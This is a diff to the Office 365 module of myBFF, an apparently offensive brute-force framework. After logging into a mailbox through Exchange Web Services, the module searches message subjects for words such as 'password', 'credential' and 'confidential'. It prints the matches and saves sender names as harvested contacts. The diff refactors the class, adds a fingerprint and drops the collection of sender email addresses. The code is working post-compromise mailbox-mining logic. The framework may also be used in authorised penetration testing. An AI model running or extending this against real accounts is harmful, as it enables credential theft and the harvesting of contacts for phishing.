@@ -1,7 +1,7 @@
 #! /bin/python
 # Created by Adam Compton (tatanus)
 # Part of myBFF
-
+from core.webModule import webModule
 import base64
 import httplib
 import urllib
@@ -9,8 +9,13 @@ import ssl
 from lxml import etree
 import re
 
-class office365Brute():
-    term = ['credential', 'account', 'password', 'login']
+class Office365Brute(webModule):
+    def __init__(self, config, display, lock):
+        super(Office365Brute, self).__init__(config, display, lock)
+        self.fingerprint="[o,O]utlook"
+        self.response="Success"
+    fingerprint = "outlook"
+    term = ['credential', 'account', 'password', 'login', 'confidential']
     def searchMessages(self, term, data, config):
         # Parse the result xml
         root = etree.fromstring(data)
@@ -33,20 +38,20 @@ class office365Brute():
                     '{http://schemas.microsoft.com/exchange/services/2006/types}From/{'
                     'http://schemas.microsoft.com/exchange/services/2006/types}Mailbox/{'
                     'http://schemas.microsoft.com/exchange/services/2006/types}Name').text
-                fromemail = element.find(
-                    '{http://schemas.microsoft.com/exchange/services/2006/types}From/{'
-                    'http://schemas.microsoft.com/exchange/services/2006/types}Mailbox/{'
-                    'http://schemas.microsoft.com/exchange/services/2006/types}EmailAddress').text
+#                fromemail = element.find(
+#                    '{http://schemas.microsoft.com/exchange/services/2006/types}From/{'
+#                    'http://schemas.microsoft.com/exchange/services/2006/types}Mailbox/{'
+#                    'http://schemas.microsoft.com/exchange/services/2006/types}EmailAddress').text
                 itemid = element.find('{http://schemas.microsoft.com/exchange/services/2006/types}ItemId').attrib['Id']
                 changekey = element.find('{http://schemas.microsoft.com/exchange/services/2006/types}ItemId').attrib[
                     'ChangeKey']
-                contacts.append(fromname.encode('ascii', 'ignore') + " (" + fromemail.encode('ascii', 'ignore') + ")")
+                contacts.append(fromname.encode('ascii', 'ignore')) #+ " (" + fromemail.encode('ascii', 'ignore') + ")")
                 for search_term in term:
                     if re.search(search_term, subject, re.IGNORECASE):
                         print "[+] This could be interesting: "
                         print "[+]       * Subject : " + subject.encode('ascii', 'ignore')
-                        print "[+]       * From : " + fromname.encode('ascii', 'ignore') + " (" + fromemail.encode('ascii',
-                                                                                                         'ignore') + ")"
+                        print "[+]       * From : " + fromname.encode('ascii', 'ignore') #+ " (" + fromemail.encode('ascii',
+                                                                                                         #'ignore') + ")"
             except:
                 pass
         print("[+]  Any contacts found will be saved to tmp/contacts-" + config["USERNAME"] + "...")
